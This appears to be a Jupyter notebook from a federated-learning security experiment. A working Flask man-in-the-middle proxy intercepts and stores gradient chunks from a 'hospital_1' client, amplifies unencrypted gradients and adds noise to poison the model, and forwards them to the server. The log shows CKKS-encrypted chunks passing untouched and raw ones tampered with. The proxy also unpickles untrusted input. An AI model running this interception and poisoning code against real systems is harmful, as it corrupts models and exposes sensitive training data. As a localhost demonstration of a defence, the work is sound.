In [ ]:
from flask import Flask, request
import requests
import pickle
import os
import numpy as np
from datetime import datetime

app = Flask(__name__)

INTERCEPTED_FOLDER = "intercepted_chunks"
os.makedirs(INTERCEPTED_FOLDER, exist_ok=True)

REAL_SERVER_URL = "https://127.0.0.1:5055/"

@app.route('/receive_chunk', methods=['POST'])
def intercept_and_forward():
    try:
        try:
            payload = pickle.loads(request.data)
        except Exception as e:
            print("[MITM] Payload is not valid Pickle data.")
            print(f" Error: {e}")
            return "[MITM] Bad payload format", 400

        chunk_id = payload.get('chunk_id', 'unknown')
        client_id = payload.get('client_id', 'unknown')
        data = payload.get('data', None)
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        client_folder = os.path.join(INTERCEPTED_FOLDER, client_id)
        os.makedirs(client_folder, exist_ok=True)
        filename = os.path.join(client_folder, f"chunk_{chunk_id}.bin")
        with open(filename, 'wb') as f:
            pickle.dump({'data': data}, f)

        print(f"\n [MITM] Intercepted chunk {chunk_id} from {client_id}")
        print(f" Time: {timestamp}")

        # Format inspection
        if isinstance(data, list):
            print(f" Payload size: {len(data)} elements")
            if all(isinstance(x, float) for x in data):
                print(" [MITM] Raw gradient chunk detected — sample:")
                print("      →", data[:5])
            else:
                print(" [MITM] Unknown list format (mixed types?)")
        elif isinstance(data, bytes):
            decoded = data.decode(errors='ignore')
            if decoded[:5].isalnum():
                print(" [MITM] Detected encrypted CKKS raw data — cannot decrypt.")
                raise Exception("Homomorphically encrypted — secure.")
            else:
                print("❓ [MITM] Unknown bytes format")
        elif isinstance(data, np.ndarray):
            print(f" Payload shape: {data.shape}")
            print(" [MITM] Raw gradient NumPy array detected — sample:")
            print("      →", data[:5].tolist())
        else:
            print(" [MITM] Unknown data format")

        # Tamper if it's raw NumPy gradients
        if isinstance(data, np.ndarray) and np.issubdtype(data.dtype, np.floating):
            # Strong corruption for accuracy drop:
            tampered = data * 100 + np.random.normal(0, 5, size=data.shape)  # amplify + noise
            payload['data'] = tampered
            payload['tampered'] = True
            print(" [MITM] Tampered gradient values before sending to server.")
        else:
            print(" [MITM] Could not tamper — data is encrypted or not float array.")

        try:
            forwarded_data = pickle.dumps(payload)
            response = requests.post(
                REAL_SERVER_URL,
                data=forwarded_data,
                headers={'Content-Type': 'application/octet-stream'},
                verify=False,
                timeout=5
            )

            if response.status_code == 200:
                print(f" [MITM] Forwarded chunk {chunk_id} to real server.\n")
                total_chunks = len(os.listdir(client_folder))
                print(f" [MITM] Total chunks from {client_id}: {total_chunks}")
                return "MITM intercepted & forwarded", 200
            else:
                print(f" [MITM] Forwarding failed: HTTP {response.status_code}")
                return f"[MITM] Server error: {response.status_code}", 502

        except requests.exceptions.RequestException as net_err:
            print(f" [MITM] Real server unreachable or error: {net_err}")
            return "[MITM] Could not forward — real server unavailable", 503

    except Exception as e:
        print(f" [MITM] Unhandled error: {e}")
        return f"[MITM ERROR] {e}", 500


if __name__ == "__main__":
    print(" [MITM] MITM Proxy listening on http://127.0.0.1:9090 ...")
    app.run(host='127.0.0.1', port=9090)


🚨 [MITM] MITM Proxy listening on http://127.0.0.1:9090 ...
 * Serving Flask app '__main__'
 * Debug mode: off


 * Running on http://127.0.0.1:9090
Press CTRL+C to quit
C:\Users\diyab\AppData\Local\Programs\Python\Python313\Lib\site-packages\urllib3\connectionpool.py:1097: InsecureRequestWarning: Unverified HTTPS request is being made to host '127.0.0.1'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#tls-warnings
  warnings.warn(
127.0.0.1 - - [22/Jul/2025 08:44:28] "POST /receive_chunk HTTP/1.1" 200 -



🛡️ [MITM] Intercepted chunk 0 from hospital_1
🕒 Time: 2025-07-22 08:44:28
❓ [MITM] Unknown bytes format
🔒 [MITM] Could not tamper — data is encrypted or not float array.
➡️ [MITM] Forwarded chunk 0 to real server.

📦 [MITM] Total chunks from hospital_1: 2

🛡️ [MITM] Intercepted chunk 1 from hospital_1
🕒 Time: 2025-07-22 08:44:28
❓ [MITM] Unknown bytes format
🔒 [MITM] Could not tamper — data is encrypted or not float array.


C:\Users\diyab\AppData\Local\Programs\Python\Python313\Lib\site-packages\urllib3\connectionpool.py:1097: InsecureRequestWarning: Unverified HTTPS request is being made to host '127.0.0.1'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#tls-warnings
  warnings.warn(
127.0.0.1 - - [22/Jul/2025 08:44:28] "POST /receive_chunk HTTP/1.1" 200 -


➡️ [MITM] Forwarded chunk 1 to real server.

📦 [MITM] Total chunks from hospital_1: 2

🛡️ [MITM] Intercepted chunk 0 from hospital_1
🕒 Time: 2025-07-22 08:48:15
🔐 Payload shape: (6787,)
🧬 [MITM] Raw gradient NumPy array detected — sample:
      → [-0.015659552067518234, 0.006446819752454758, -0.006557384040206671, 0.013078657910227776, -0.010356711223721504]
⚠️ [MITM] Tampered gradient values before sending to server.
➡️ [MITM] Forwarded chunk 0 to real server.



...


🛡️ [MITM] Intercepted chunk 0 from hospital_1
🕒 Time: 2025-07-22 08:59:43
🔐 Payload shape: (6787,)
🧬 [MITM] Raw gradient NumPy array detected — sample:
      → [0.015767216682434082, 0.014978768303990364, 0.0006299346568994224, 0.0007050977437756956, -0.0024339016526937485]
⚠️ [MITM] Tampered gradient values before sending to server.
➡️ [MITM] Forwarded chunk 0 to real server.

📦 [MITM] Total chunks from hospital_1: 2

🛡️ [MITM] Intercepted chunk 1 from hospital_1
🕒 Time: 2025-07-22 08:59:43
🔐 Payload shape: (6786,)
🧬 [MITM] Raw gradient NumPy array detected — sample:
      → [0.0, 0.010111315175890923, 0.02845778316259384, 0.004693533759564161, 0.0336025096476078]
⚠️ [MITM] Tampered gradient values before sending to server.
➡️ [MITM] Forwarded chunk 1 to real server.

📦 [MITM] Total chunks from hospital_1: 2


C:\Users\diyab\AppData\Local\Programs\Python\Python313\Lib\site-packages\urllib3\connectionpool.py:1097: InsecureRequestWarning: Unverified HTTPS request is being made to host '127.0.0.1'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#tls-warnings
  warnings.warn(
127.0.0.1 - - [22/Jul/2025 08:59:56] "POST /receive_chunk HTTP/1.1" 200 -
C:\Users\diyab\AppData\Local\Programs\Python\Python313\Lib\site-packages\urllib3\connectionpool.py:1097: InsecureRequestWarning: Unverified HTTPS request is being made to host '127.0.0.1'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#tls-warnings
  warnings.warn(
127.0.0.1 - - [22/Jul/2025 08:59:56] "POST /receive_chunk HTTP/1.1" 200 -



🛡️ [MITM] Intercepted chunk 0 from hospital_1
🕒 Time: 2025-07-22 08:59:56
🔐 Payload shape: (6787,)
🧬 [MITM] Raw gradient NumPy array detected — sample:
      → [0.006330028176307678, 0.030939290300011635, 0.0038436558097600937, -0.00639061676338315, 0.007628605701029301]
⚠️ [MITM] Tampered gradient values before sending to server.
➡️ [MITM] Forwarded chunk 0 to real server.

📦 [MITM] Total chunks from hospital_1: 2

🛡️ [MITM] Intercepted chunk 1 from hospital_1
🕒 Time: 2025-07-22 08:59:56
🔐 Payload shape: (6786,)
🧬 [MITM] Raw gradient NumPy array detected — sample:
      → [0.0, 0.0, 0.0, 0.0, 0.0]
⚠️ [MITM] Tampered gradient values before sending to server.
➡️ [MITM] Forwarded chunk 1 to real server.

📦 [MITM] Total chunks from hospital_1: 2


C:\Users\diyab\AppData\Local\Programs\Python\Python313\Lib\site-packages\urllib3\connectionpool.py:1097: InsecureRequestWarning: Unverified HTTPS request is being made to host '127.0.0.1'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#tls-warnings
  warnings.warn(
127.0.0.1 - - [22/Jul/2025 09:00:26] "POST /receive_chunk HTTP/1.1" 200 -
C:\Users\diyab\AppData\Local\Programs\Python\Python313\Lib\site-packages\urllib3\connectionpool.py:1097: InsecureRequestWarning: Unverified HTTPS request is being made to host '127.0.0.1'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#tls-warnings
  warnings.warn(
127.0.0.1 - - [22/Jul/2025 09:00:26] "POST /receive_chunk HTTP/1.1" 200 -



🛡️ [MITM] Intercepted chunk 0 from hospital_1
🕒 Time: 2025-07-22 09:00:26
🔐 Payload shape: (6787,)
🧬 [MITM] Raw gradient NumPy array detected — sample:
      → [-0.017977740615606308, -0.01229619700461626, -0.00046169786946848035, 0.0009408545447513461, -0.002095727249979973]
⚠️ [MITM] Tampered gradient values before sending to server.
➡️ [MITM] Forwarded chunk 0 to real server.

📦 [MITM] Total chunks from hospital_1: 2

🛡️ [MITM] Intercepted chunk 1 from hospital_1
🕒 Time: 2025-07-22 09:00:26
🔐 Payload shape: (6786,)
🧬 [MITM] Raw gradient NumPy array detected — sample:
      → [0.0, 0.00021874783851671964, 0.00047232891665771604, 0.0006517032161355019, 0.0]
⚠️ [MITM] Tampered gradient values before sending to server.
➡️ [MITM] Forwarded chunk 1 to real server.

📦 [MITM] Total chunks from hospital_1: 2
